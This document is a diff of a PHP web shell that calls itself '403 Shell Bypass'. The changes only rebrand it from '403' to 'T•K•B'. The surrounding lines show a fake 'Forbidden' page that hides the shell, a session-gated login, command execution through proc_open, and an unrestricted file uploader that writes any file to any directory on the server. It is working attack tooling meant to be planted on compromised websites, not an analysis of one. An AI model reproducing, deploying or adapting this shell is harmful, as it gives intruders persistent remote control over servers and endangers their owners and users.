@@ -49,7 +49,7 @@ function login_shell()
             font-weight: bold;
           "
         >
-          403
+          T•K•B
         </h1>
         <h2 style="margin-top: 20px; font-size: 30px">Forbidden</h2>
         <p>Access to this resource on the server is denied!</p>
@@ -93,7 +93,7 @@ if (!isset($_SESSION[base64_encode($_SERVER['HTTP_HOST'])])) {
 }
 ?>
 <html>
-  <title>403</title>
+  <title>T•K•B</title>
   <style>
         body {
             color: red;
@@ -107,7 +107,7 @@ if (!isset($_SESSION[base64_encode($_SERVER['HTTP_HOST'])])) {
 <body> 
   <br></br>
   <center><h1><pre>
-SEO403
+T•K•B
 </pre></h1></center>
 </body>
 <form method="post">
@@ -129,7 +129,7 @@ $process = proc_open($cmd, $descriptorspec, $pipes, $meki, $env);
 echo stream_get_contents($pipes[1]); die; }
 ?>
 
-</script> <div id="app"> <g size="1px">403</h1> <span class="sub">Uploader :</span> <?php $uploadd = $_FILES['file']['tmp_name']; if (file_exists($uploadd)) { $pwddir = $_POST['dir']; $real = $_FILES['file']['name']; $de = $pwddir."/".$real; copy($uploadd, $de); echo "File berhasil di upload sayang ^_^ $de"; } ?> <form method="post" enctype="multipart/form-data"> <input type="text" name="dir" size="30" value="<? echo getcwd(); ?>"> <input type="file" name="file" size="15"> <input type="submit" value="Upload"> </form> 
+</script> <div id="app"> <g size="1px">T•K•B</h1> <span class="sub">Uploader :</span> <?php $uploadd = $_FILES['file']['tmp_name']; if (file_exists($uploadd)) { $pwddir = $_POST['dir']; $real = $_FILES['file']['name']; $de = $pwddir."/".$real; copy($uploadd, $de); echo "File berhasil di upload sayang ^_^ $de"; } ?> <form method="post" enctype="multipart/form-data"> <input type="text" name="dir" size="30" value="<? echo getcwd(); ?>"> <input type="file" name="file" size="15"> <input type="submit" value="Upload"> </form> 
 <!DOCTYPE html>
 <html>
 <?php
@@ -142,7 +142,7 @@ if (empty($disfunc)) {
 }
 
 function author() {
-	echo "<center><br>403 Shell Bypass</center>";
+	echo "<center><br>T•K•B Shell Bypass</center>";
 	exit();
 }
 
